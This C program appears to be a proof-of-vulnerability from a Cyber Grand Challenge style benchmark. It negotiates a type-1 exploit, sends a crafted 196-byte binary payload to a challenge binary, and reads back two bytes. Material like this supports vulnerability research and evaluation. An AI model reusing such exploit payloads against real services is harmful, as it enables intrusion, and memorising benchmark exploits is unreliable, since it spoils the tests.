#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\xd1\x74\x6b\xd8\x41\x00\x00\x00\x36\x90\x25\x03\xb4\x00\x00\x00"
         "\x50\x4b\x0a\x35\x34\x37\x30\x36\x30\x38\x30\x20\x20\x20\x20\x39"
         "\x0d\x0c\x0c\x0c\x0c\x0c\x20\x20\x0c\x0c\x30\x32\x35\x35\x00\x00"
         "\x40\x0e\xc1\xff\xb1\xaf\xa3\x4c\xc3\xad\x36\xf9\xfa\x56\x42\xdf"
         "\x55\x00\xd1\xdd\x0f\x59\x27\x7e\x63\x1c\x64\x00\x6c\x0b\xab\xbd"
         "\x08\x5b\xbb\xbc\x38\x5b\x9e\x83\xeb\x40\xbc\xe5\xd4\x31\x10\x96"
         "\xb0\xed\x80\x3c\x90\x23\xd4\xaa\xba\xf1\xad\xb8\xd2\xab\xcd\x52"
         "\x3d\xf1\xe9\xdf\x7b\x99\xa1\x8f\x79\x7d\x95\x18\xf6\x28\x15\x42"
         "\x35\x3f\x77\xff\xd8\xa7\x98\xa7\x4e\x53\xee\x8a\x0a\x32\x1f\x35"
         "\x0a\x7e\x46\x40\x0e\xc1\xaa\x02\x00\x6b\x9e\xd6\xe5\x8b\xa5\xb1"
         "\x15\x27\xf5\x9a\xa2\xf1\x57\x96\xbe\x2d\x54\x41\xd6\x76\x8f\x08"
         "\xa2\x39\x12\xd4\x14\xc4\xaf\x1b\x2c\x44\xf4\x01\x7f\x25\x45\x9d"
         "\xb8\x06\x48\xa7";
      static unsigned int write_00000_00000_len = 196;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** length read
      read_00000_len = 1;
      read_00000 = (unsigned char*)cgc_malloc(read_00000_len);
      int read_00000_res = cgc_length_read(0, read_00000, read_00000_len);
      if (read_00000_res) {} //silence unused variable warning
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** length read
      read_00001_len = 1;
      read_00001 = (unsigned char*)cgc_malloc(read_00001_len);
      int read_00001_res = cgc_length_read(0, read_00001, read_00001_len);
      if (read_00001_res) {} //silence unused variable warning
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   //*** delay
   cgc_delay(5000);
}
